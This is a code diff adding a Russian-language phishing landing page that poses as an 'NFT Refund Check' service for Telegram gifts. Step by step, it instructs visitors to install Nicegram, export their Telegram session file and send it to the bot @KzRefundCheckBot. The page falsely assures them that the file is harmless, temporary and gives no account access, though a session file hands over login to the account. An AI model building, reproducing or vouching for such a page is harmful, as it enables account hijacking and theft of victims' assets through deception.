@@ -1,0 +1,991 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NFT Refund Check | Проверка рефаунда NFT подарков</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-primary: #000000;
+            --bg-secondary: #1d1d1f;
+            --bg-tertiary: #2c2c2e;
+            --text-primary: #f5f5f7;
+            --text-secondary: #a1a1a6;
+            --accent: #007aff;
+            --accent-hover: #0a84ff;
+            --success: #30d158;
+            --warning: #ff9f0a;
+            --danger: #ff3b30;
+            --border: #424245;
+            --card-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            --transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background-color: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.6;
+            overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Header */
+        header {
+            padding: 30px 0;
+            border-bottom: 1px solid var(--border);
+            position: sticky;
+            top: 0;
+            background-color: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(20px);
+            z-index: 100;
+        }
+
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--text-primary);
+        }
+
+        .logo-icon {
+            color: var(--accent);
+            font-size: 28px;
+        }
+
+        nav ul {
+            display: flex;
+            gap: 30px;
+            list-style: none;
+        }
+
+        nav a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 17px;
+            transition: var(--transition);
+            position: relative;
+            padding-bottom: 5px;
+        }
+
+        nav a:hover {
+            color: var(--text-primary);
+        }
+
+        nav a::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background-color: var(--accent);
+            transition: var(--transition);
+        }
+
+        nav a:hover::after {
+            width: 100%;
+        }
+
+        /* Hero Section */
+        .hero {
+            padding: 100px 0;
+            text-align: center;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .hero h1 {
+            font-size: 56px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            background: linear-gradient(135deg, #007aff, #5856d6);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: fadeInUp 0.8s ease-out;
+        }
+
+        .hero p {
+            font-size: 24px;
+            color: var(--text-secondary);
+            max-width: 700px;
+            margin: 0 auto 40px;
+            animation: fadeInUp 0.8s ease-out 0.2s both;
+        }
+
+        .hero-badge {
+            display: inline-block;
+            background-color: var(--bg-tertiary);
+            color: var(--warning);
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 30px;
+            animation: fadeInUp 0.8s ease-out 0.4s both;
+        }
+
+        .bot-link-container {
+            margin-top: 40px;
+            animation: fadeInUp 0.8s ease-out 0.6s both;
+        }
+
+        .bot-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            background-color: var(--accent);
+            color: white;
+            padding: 18px 32px;
+            border-radius: 14px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 18px;
+            transition: var(--transition);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .bot-link:hover {
+            background-color: var(--accent-hover);
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(0, 122, 255, 0.2);
+        }
+
+        /* Cards */
+        .section-title {
+            font-size: 40px;
+            font-weight: 700;
+            margin: 80px 0 40px;
+            text-align: center;
+        }
+
+        .section-subtitle {
+            font-size: 20px;
+            color: var(--text-secondary);
+            text-align: center;
+            max-width: 600px;
+            margin: 0 auto 60px;
+        }
+
+        .cards-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 30px;
+            margin-bottom: 80px;
+        }
+
+        .card {
+            background-color: var(--bg-secondary);
+            border-radius: 20px;
+            padding: 40px 30px;
+            box-shadow: var(--card-shadow);
+            transition: var(--transition);
+            border: 1px solid transparent;
+            animation: fadeInUp 0.8s ease-out;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .card:hover {
+            transform: translateY(-10px);
+            border-color: var(--border);
+        }
+
+        .card-icon {
+            width: 70px;
+            height: 70px;
+            background: linear-gradient(135deg, var(--accent), #5856d6);
+            border-radius: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 25px;
+            font-size: 28px;
+        }
+
+        .card h3 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 15px;
+        }
+
+        .card p {
+            color: var(--text-secondary);
+            margin-bottom: 25px;
+            flex-grow: 1;
+        }
+
+        .step {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 25px;
+            padding-bottom: 25px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .step:last-child {
+            margin-bottom: 0;
+            padding-bottom: 0;
+            border-bottom: none;
+        }
+
+        .step-number {
+            width: 36px;
+            height: 36px;
+            background-color: var(--accent);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            margin-right: 15px;
+            flex-shrink: 0;
+        }
+
+        .step-content h4 {
+            font-size: 18px;
+            margin-bottom: 8px;
+        }
+
+        .step-content p {
+            font-size: 15px;
+            color: var(--text-secondary);
+            margin-bottom: 0;
+        }
+
+        .code-block {
+            background-color: var(--bg-tertiary);
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0;
+            font-family: 'SF Mono', Monaco, 'Courier New', monospace;
+            overflow-x: auto;
+            border-left: 4px solid var(--accent);
+            font-size: 14px;
+        }
+
+        .warning-box {
+            background-color: rgba(255, 159, 10, 0.1);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            border-left: 4px solid var(--warning);
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+        }
+
+        .warning-box i {
+            color: var(--warning);
+            font-size: 18px;
+            margin-top: 2px;
+        }
+
+        .success-box {
+            background-color: rgba(48, 209, 88, 0.1);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            border-left: 4px solid var(--success);
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+        }
+
+        .success-box i {
+            color: var(--success);
+            font-size: 18px;
+            margin-top: 2px;
+        }
+
+        .danger-box {
+            background-color: rgba(255, 59, 48, 0.1);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            border-left: 4px solid var(--danger);
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+        }
+
+        .danger-box i {
+            color: var(--danger);
+            font-size: 18px;
+            margin-top: 2px;
+        }
+
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            background-color: var(--accent);
+            color: white;
+            padding: 14px 28px;
+            border-radius: 12px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 17px;
+            transition: var(--transition);
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            margin-top: auto;
+        }
+
+        .btn:hover {
+            background-color: var(--accent-hover);
+            transform: translateY(-3px);
+        }
+
+        .btn-secondary {
+            background-color: transparent;
+            border: 1px solid var(--accent);
+        }
+
+        .btn-secondary:hover {
+            background-color: rgba(0, 122, 255, 0.1);
+        }
+
+        .btn-success {
+            background-color: var(--success);
+        }
+
+        .btn-success:hover {
+            background-color: #34c759;
+        }
+
+        /* Platform Selector */
+        .platform-selector {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+
+        .platform-btn {
+            background-color: var(--bg-tertiary);
+            color: var(--text-secondary);
+            border: none;
+            padding: 12px 24px;
+            border-radius: 10px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+
+        .platform-btn:hover {
+            background-color: var(--border);
+            color: var(--text-primary);
+        }
+
+        .platform-btn.active {
+            background-color: var(--accent);
+            color: white;
+        }
+
+        .platform-content {
+            display: none;
+        }
+
+        .platform-content.active {
+            display: block;
+        }
+
+        /* FAQ */
+        .faq-container {
+            max-width: 800px;
+            margin: 0 auto 80px;
+        }
+
+        .faq-item {
+            background-color: var(--bg-secondary);
+            border-radius: 14px;
+            margin-bottom: 15px;
+            overflow: hidden;
+            border: 1px solid var(--border);
+        }
+
+        .faq-question {
+            padding: 22px 25px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: var(--transition);
+        }
+
+        .faq-question:hover {
+            background-color: rgba(255, 255, 255, 0.05);
+        }
+
+        .faq-answer {
+            padding: 0 25px;
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.3s ease;
+            color: var(--text-secondary);
+        }
+
+        .faq-answer.active {
+            padding: 0 25px 25px;
+            max-height: 500px;
+        }
+
+        /* Footer */
+        footer {
+            border-top: 1px solid var(--border);
+            padding: 40px 0;
+            text-align: center;
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-bottom: 20px;
+        }
+
+        .footer-links a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            transition: var(--transition);
+            font-size: 15px;
+        }
+
+        .footer-links a:hover {
+            color: var(--accent);
+        }
+
+        /* Animations */
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes pulse {
+            0% {
+                box-shadow: 0 0 0 0 rgba(0, 122, 255, 0.4);
+            }
+            70% {
+                box-shadow: 0 0 0 10px rgba(0, 122, 255, 0);
+            }
+            100% {
+                box-shadow: 0 0 0 0 rgba(0, 122, 255, 0);
+            }
+        }
+
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .hero h1 {
+                font-size: 40px;
+            }
+            
+            .hero p {
+                font-size: 20px;
+            }
+            
+            .section-title {
+                font-size: 32px;
+            }
+            
+            .cards-container {
+                grid-template-columns: 1fr;
+            }
+            
+            nav ul {
+                gap: 15px;
+            }
+            
+            nav a {
+                font-size: 15px;
+            }
+            
+            .platform-selector {
+                flex-wrap: wrap;
+            }
+            
+            .footer-links {
+                flex-wrap: wrap;
+                gap: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div class="header-content">
+                <div class="logo">
+                    <i class="fas fa-shield-check logo-icon"></i>
+                    <span>NFT Refund Check</span>
+                </div>
+                <nav>
+                    <ul>
+                        <li><a href="#download">Скачать Nicegram</a></li>
+                        <li><a href="#export">Экспорт сессии</a></li>
+                        <li><a href="#bot">Отправить боту</a></li>
+                        <li><a href="#faq">FAQ</a></li>
+                    </ul>
+                </nav>
+            </div>
+        </div>
+    </header>
+
+    <main>
+        <section class="hero">
+            <div class="container">
+                <div class="hero-badge">
+                    <i class="fas fa-shield-alt"></i> Безопасная проверка рефаунда NFT
+                </div>
+                <h1>Проверка рефаунда NFT подарков</h1>
+                <p>Полное руководство по проверке возврата средств за NFT подарки в Telegram. Следуйте инструкциям ниже, чтобы безопасно проверить статус рефаунда.</p>
+                
+                <div class="bot-link-container">
+                    <a href="https://t.me/KzRefundCheckBot" target="_blank" class="bot-link pulse">
+                        <i class="fab fa-telegram"></i>
+                        Перейти к боту @KzRefundCheckBot
+                    </a>
+                </div>
+            </div>
+        </section>
+
+        <div class="container">
+            <h2 class="section-title" id="download">Скачивание Nicegram</h2>
+            <p class="section-subtitle">Nicegram — модифицированный клиент Telegram с расширенными функциями, включая экспорт сессии</p>
+            
+            <div class="platform-selector">
+                <button class="platform-btn active" data-platform="ios">iOS</button>
+                <button class="platform-btn" data-platform="android">Android</button>
+                <button class="platform-btn" data-platform="desktop">ПК</button>
+            </div>
+            
+            <div class="cards-container">
+                <div class="card">
+                    <div class="card-icon">
+                        <i class="fas fa-download"></i>
+                    </div>
+                    <h3>Установка Nicegram</h3>
+                    <p>Скачайте и установите Nicegram для вашей платформы. Это необходимо для получения файла сессии вашего аккаунта Telegram.</p>
+                    
+                    <!-- iOS инструкция -->
+                    <div class="platform-content active" id="ios-content">
+                        <div class="step">
+                            <div class="step-number">1</div>
+                            <div class="step-content">
+                                <h4>Откройте App Store</h4>
+                                <p>На вашем iPhone или iPad откройте приложение App Store.</p>
+                            </div>
+                        </div>
+                        
+                        <div class="step">
+                            <div class="step-number">2</div>
+                            <div class="step-content">
+                                <h4>Найдите Nicegram</h4>
+                                <p>В поиске введите "Nicegram" и найдите приложение с иконкой бумажного самолетика.</p>
+                            </div>
+                        </div>
+                        
+                        <div class="step">
+                            <div class="step-number">3</div>
+                            <div class="step-content">
+                                <h4>Установите и войдите</h4>
+                                <p>Нажмите "Загрузить", дождитесь установки и войдите в свой аккаунт Telegram.</p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Android инструкция -->
+                    <div class="platform-content" id="android-content">
+                        <div class="step">
+                            <div class="step-number">1</div>
+                            <div class="step-content">
+                                <h4>Откройте Google Play</h4>
+                                <p>На вашем Android устройстве откройте приложение Google Play Маркет.</p>
+                            </div>
+                        </div>
+                        
+                        <div class="step">
+                            <div class="step-number">2</div>
+                            <div class="step-content">
+                                <h4>Найдите Nicegram</h4>
+                                <p>В поиске введите "Nicegram" и найдите приложение от разработчика "Nicegram Inc.".</p>
+                            </div>
+                        </div>
+                        
+                        <div class="step">
+                            <div class="step-number">3</div>
+                            <div class="step-content">
+                                <h4>Установите и войдите</h4>
+                                <p>Нажмите "Установить", дождитесь загрузки и войдите в свой аккаунт Telegram.</p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Desktop инструкция -->
+                    <div class="platform-content" id="desktop-content">
+                        <div class="step">
+                            <div class="step-number">1</div>
+                            <div class="step-content">
+                                <h4>Посетите сайт Nicegram</h4>
+                                <p>Перейдите на официальный сайт <a href="https://nicegram.app" target="_blank" style="color: var(--accent);">nicegram.app</a>.</p>
+                            </div>
+                        </div>
+                        
+                        <div class="step">
+                            <div class="step-number">2</div>
+                            <div class="step-content">
+                                <h4>Выберите вашу ОС</h4>
+                                <p>Скачайте версию для вашей операционной системы (Windows, macOS или Linux).</p>
+                            </div>
+                        </div>
+                        
+                        <div class="step">
+                            <div class="step-number">3</div>
+                            <div class="step-content">
+                                <h4>Установите и войдите</h4>
+                                <p>Установите приложение на компьютер и войдите в свой аккаунт Telegram.</p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="warning-box">
+                        <i class="fas fa-exclamation-triangle"></i>
+                        <div>
+                            <strong>Важно:</strong> Скачивайте Nicegram только из официальных источников: App Store, Google Play или nicegram.app
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <h2 class="section-title" id="export">Экспорт сессии аккаунта</h2>
+            <p class="section-subtitle">Получите файл сессии из Nicegram для безопасной проверки рефаунда</p>
+            
+            <div class="cards-container">
+                <div class="card">
+                    <div class="card-icon">
+                        <i class="fas fa-file-export"></i>
+                    </div>
+                    <h3>Получение файла сессии</h3>
+                    <p>Экспортируйте сессию вашего аккаунта в виде файла. Это временные данные для авторизации, которые безопасно отправить боту.</p>
+                    
+                    <div class="step">
+                        <div class="step-number">1</div>
+                        <div class="step-content">
+                            <h4>Откройте настройки Nicegram</h4>
+                            <p>В приложении Nicegram перейдите в "Настройки" → "Nicegram Settings".</p>
+                        </div>
+                    </div>
+                    
+                    <div class="step">
+                        <div class="step-number">2</div>
+                        <div class="step-content">
+                            <h4>Найдите раздел экспорта</h4>
+                            <p>Прокрутите вниз до раздела "Advanced" и найдите опцию "Export Telegram session".</p>
+                        </div>
+                    </div>
+                    
+                    <div class="step">
+                        <div class="step-number">3</div>
+                        <div class="step-content">
+                            <h4>Экспортируйте в файл</h4>
+                            <p>Нажмите "Export session" и выберите "Export to file". Сохраните файл на ваше устройство.</p>
+                            <div class="code-block">
+                                // Файл будет называться примерно так:<br>
+                                // telegram_session_XXXXXXXXXXX.txt
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="success-box">
+                        <i class="fas fa-check-circle"></i>
+                        <div>
+                            <strong>Безопасно:</strong> Файл сессии содержит только временные данные авторизации, которые истекают через некоторое время.
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <h2 class="section-title" id="bot">Отправка файла боту</h2>
+            <p class="section-subtitle">Отправьте файл сессии официальному боту для проверки рефаунда</p>
+            
+            <div class="cards-container">
+                <div class="card">
+                    <div class="card-icon">
+                        <i class="fab fa-telegram"></i>
+                    </div>
+                    <h3>Проверка через @KzRefundCheckBot</h3>
+                    <p>Отправьте файл сессии официальному боту для проверки статуса рефаунда вашего NFT подарка.</p>
+                    
+                    <div class="step">
+                        <div class="step-number">1</div>
+                        <div class="step-content">
+                            <h4>Перейдите к боту</h4>
+                            <p>Откройте <a href="https://t.me/KzRefundCheckBot" target="_blank" style="color: var(--accent); font-weight: 600;">@KzRefundCheckBot</a> в Telegram и нажмите START.</p>
+                        </div>
+                    </div>
+                    
+                    <div class="step">
+                        <div class="step-number">2</div>
+                        <div class="step-content">
+                            <h4>Отправьте файл сессии</h4>
+                            <p>Нажмите на скрепку 📎 (прикрепить файл) и выберите файл, который вы экспортировали из Nicegram.</p>
+                        </div>
+                    </div>
+                    
+                    <div class="step">
+                        <div class="step-number">3</div>
+                        <div class="step-content">
+                            <h4>Получите результат</h4>
+                            <p>Дождитесь обработки файла (10-30 секунд). Бот покажет статус рефаунда для вашего аккаунта.</p>
+                        </div>
+                    </div>
+                    
+                    <a href="https://t.me/KzRefundCheckBot" target="_blank" class="btn btn-success">
+                        <i class="fab fa-telegram"></i>
+                        Открыть @KzRefundCheckBot
+                    </a>
+                    
+                    <div class="danger-box">
+                        <i class="fas fa-radiation-alt"></i>
+                        <div>
+                            <strong>Внимание:</strong> Отправляйте файл сессии только официальному боту @KzRefundCheckBot. Никогда не отправляйте его другим пользователям или в чаты.
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <h2 class="section-title" id="faq">Частые вопросы</h2>
+            
+            <div class="faq-container">
+                <div class="faq-item">
+                    <div class="faq-question">
+                        <span>Безопасно ли отправлять файл сессии боту?</span>
+                        <i class="fas fa-chevron-down"></i>
+                    </div>
+                    <div class="faq-answer">
+                        Да, это безопасно. Файл сессии содержит только временные данные для авторизации, которые становятся недействительными через некоторое время. Бот использует их только для проверки статуса рефаунда и не имеет доступа к вашему аккаунту, паролю или личным сообщениям.
+                    </div>
+                </div>
+                
+                <div class="faq-item">
+                    <div class="faq-question">
+                        <span>Что делать, если бот не отвечает?</span>
+                        <i class="fas fa-chevron-down"></i>
+                    </div>
+                    <div class="faq-answer">
+                        <ol>
+                            <li>Убедитесь, что вы пишете правильному боту: @KzRefundCheckBot</li>
+                            <li>Проверьте подключение к интернету</li>
+                            <li>Попробуйте перезапустить Telegram</li>
+                            <li>Подождите несколько минут и попробуйте снова</li>
+                            <li>Если проблема persists, обратитесь в поддержку проекта</li>
+                        </ol>
+                    </div>
+                </div>
+                
+                <div class="faq-item">
+                    <div class="faq-question">
+                        <span>Можно ли проверить несколько аккаунтов?</span>
+                        <i class="fas fa-chevron-down"></i>
+                    </div>
+                    <div class="faq-answer">
+                        Да, для каждого аккаунта Telegram нужно создать отдельный файл сессии через Nicegram и отправить его боту. Не используйте один файл сессии для разных аккаунтов.
+                    </div>
+                </div>
+                
+                <div class="faq-item">
+                    <div class="faq-question">
+                        <span>Какой формат файла нужен для отправки?</span>
+                        <i class="fas fa-chevron-down"></i>
+                    </div>
+                    <div class="faq-answer">
+                        Бот принимает файлы в форматах .txt или .zip, которые создает Nicegram при экспорте сессии. Не переименовывайте и не изменяйте содержимое файла перед отправкой.
+                    </div>
+                </div>
+                
+                <div class="faq-item">
+                    <div class="faq-question">
+                        <span>Сколько времени занимает проверка?</span>
+                        <i class="fas fa-chevron-down"></i>
+                    </div>
+                    <div class="faq-answer">
+                        Обычно проверка занимает от 10 до 30 секунд. В редких случаях, при высокой нагрузке на сервера, обработка может занять до 1-2 минут.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-links">
+                <a href="https://t.me/KzRefundCheckBot" target="_blank"><i class="fab fa-telegram"></i> Официальный бот</a>
+                <a href="https://nicegram.app" target="_blank"><i class="fas fa-external-link-alt"></i> Nicegram сайт</a>
+                <a href="#faq"><i class="fas fa-question-circle"></i> Помощь</a>
+            </div>
+            <p>© 2023 NFT Refund Check. Данный сайт предоставляет только инструкции по проверке рефаундов.</p>
+            <p style="margin-top: 10px; font-size: 12px; color: #6e6e73;">Мы не храним и не обрабатываем ваши данные. Все операции выполняются через официального бота.</p>
+        </div>
+    </footer>
+
+    <script>
+        // Плавная прокрутка к разделам
+        document.querySelectorAll('nav a, .bot-link, .btn').forEach(anchor => {
+            anchor.addEventListener('click', function(e) {
+                const href = this.getAttribute('href');
+                if (href && href.startsWith('#')) {
+                    e.preventDefault();
+                    
+                    const targetId = href;
+                    const targetElement = document.querySelector(targetId);
+                    if (targetElement) {
+                        window.scrollTo({
+                            top: targetElement.offsetTop - 100,
+                            behavior: 'smooth'
+                        });
+                    }
+                }
+            });
+        });
+
+        // Переключение платформ
+        document.querySelectorAll('.platform-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                const platform = this.getAttribute('data-platform');
+                
+                // Убираем активный класс у всех кнопок
+                document.querySelectorAll('.platform-btn').forEach(b => {
+                    b.classList.remove('active');
+                });
+                
+                // Добавляем активный класс текущей кнопке
+                this.classList.add('active');
+                
+                // Скрываем все контенты платформ
+                document.querySelectorAll('.platform-content').forEach(content => {
+                    content.classList.remove('active');
+                });
+                
+                // Показываем выбранный контент
+                const targetContent = document.getElementById(`${platform}-content`);
+                if (targetContent) {
+                    targetContent.classList.add('active');
+                }
+            });
+        });
+
+        // FAQ аккордеон
+        document.querySelectorAll('.faq-question').forEach(question => {
+            question.addEventListener('click', function() {
+                const answer = this.nextElementSibling;
+                const icon = this.querySelector('i');
+                
+                // Переключаем активный класс
+                answer.classList.toggle('active');
+                
+                // Меняем иконку
+                if (answer.classList.contains('active')) {
+                    icon.classList.remove('fa-chevron-down');
+                    icon.classList.add('fa-chevron-up');
+                } else {
+                    icon.classList.remove('fa-chevron-up');
+                    icon.classList.add('fa-chevron-down');
+                }
+                
+                // Закрываем другие открытые ответы
+                document.querySelectorAll('.faq-answer').forEach(otherAnswer => {
+                    if (otherAnswer !== answer && otherAnswer.classList.contains('active')) {
+                        otherAnswer.classList.remove('active');
+                        const otherIcon = otherAnswer.previousElementSibling.querySelector('i');
+                        otherIcon.classList.remove('fa-chevron-up');
+                        otherIcon.classList.add('fa-chevron-down');
+                    }
+                });
+            });
+        });
+
+        // Анимация появления элементов при прокрутке
+        const observerOptions = {
+            threshold: 0.1,
+            rootMargin: '0px 0px -50px 0px'
+        };
+
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.style.opacity = '1';
+                    entry.target.style.transform = 'translateY(0)';
+                }
+            });
+        }, observerOptions);
+
+        // Наблюдаем за всеми карточками
+        document.querySelectorAll('.card').forEach(card => {
+            card.style.opacity = '0';
+            card.style.transform = 'translateY(30px)';
+            card.style.transition = 'opacity 0.8s ease, transform 0.8s ease';
+            observer.observe(card);
+        });
+
+        // Показываем уведомление при копировании
+        document.querySelectorAll('.code-block').forEach(block => {
+            block.addEventListener('click', function() {
+                const textToCopy = this.innerText;
+                navigator.clipboard.writeText(textToCopy).then(() => {
+                    const originalHTML = this.innerHTML;
+                    this.innerHTML = '<i class="fas fa-check"></i> Скопировано в буфер обмена!';
+                    this.style.color = 'var(--success)';
+                    
+                    setTimeout(() => {
+                        this.innerHTML = originalHTML;
+                        this.style.color = '';
+                    }, 2000);
+                });
+            });
+            
+            block.style.cursor = 'pointer';
+            block.title = 'Нажмите, чтобы скопировать';
+        });
+    </script>
+</body>
+</html>
